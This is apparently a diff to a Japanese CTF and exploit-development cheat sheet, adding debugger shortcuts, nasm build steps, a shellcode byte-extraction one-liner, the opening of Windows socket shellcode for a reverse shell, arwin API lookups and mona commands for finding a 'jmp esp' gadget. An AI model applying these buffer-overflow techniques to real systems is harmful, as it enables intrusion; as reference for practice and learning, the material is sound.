@@ -194,6 +194,13 @@ https://github.com/hugsy/gef
 - `[Shift]+[F8]`   
 - `[Alt]+E`   
 実行可能モジュールのリストを表示   
+### Immunity Debugger
+- `[F7],[F8]`   
+ステップイン、ステップオーバー実行   
+- `[F2]`   
+set brakepoint   
+- `[Alt]+E`   
+実行可能モジュールのリストを表示   
 
 ### angr
 以下でInstall   
@@ -2161,6 +2168,7 @@ conn.sendlineafter("ID: ", "A"*40 + rop.chain() )
 #### metasploit
 `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4000`   
 `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 336e4532`   
+#### nasm
 `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb `   
 ```txt
 nasm > jmp $+17
@@ -2171,6 +2179,49 @@ nasm > jmp esp
 00000000  FFE4              jmp esp
 
 0xCC INT3       <- この命令を実行後ブレークする。Exploit書く時のデバッグに使える 
+```
+- `nasm -felf32 sample.asm`   
+- `ld -m elf_i386 sample.o -o sample.out`   
+- `for i in $(objdump -d sample.out |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo`   
+```txt
+global _start
+
+section .text
+
+_start:
+
+;WINSOCK_API_LINKAGE SOCKET WSAAPI WSASocketA(
+;  int                 af - 2, AF_INET (IPv4)
+;  int                 type - 1, SOCK_STREAM (TCP)
+;  int                 protocol - 6, IPPROTO_TCP (TCP)
+;  LPWSAPROTOCOL_INFOA lpProtocolInfo - NULL,
+;  GROUP               g - 0, No group operation
+;  DWORD               dwFlags - 0 No flags
+;);
+
+; Create the socket with WSASocketA()
+
+xor eax,eax
+push eax        ; dwFlags 0
+push eax        ; group
+push eax        ; ProtocolInfo
+xor ebx,ebx    
+mov bl,6
+push ebx        ; Protocol IPPROTO_TCP 6
+```
+#### Windows周り
+- `arwin`   
+```txt
+arwin.exe kernel32 CreateProcessA
+arwin.exe ws2_32 WSASocketA
+arwin.exe ws2_32 connect
+arwin.exe kernel32.dll WinExec
+arwin.exe user32 MessageBoxA
+```
+- `mona`   
+```txt
+!mona modules
+!mona find -s "¥xff¥xe4" -m slmfc.dll
 ```
 #### alarmのbypass
 `hexedit`でバイナリを書き換える。   
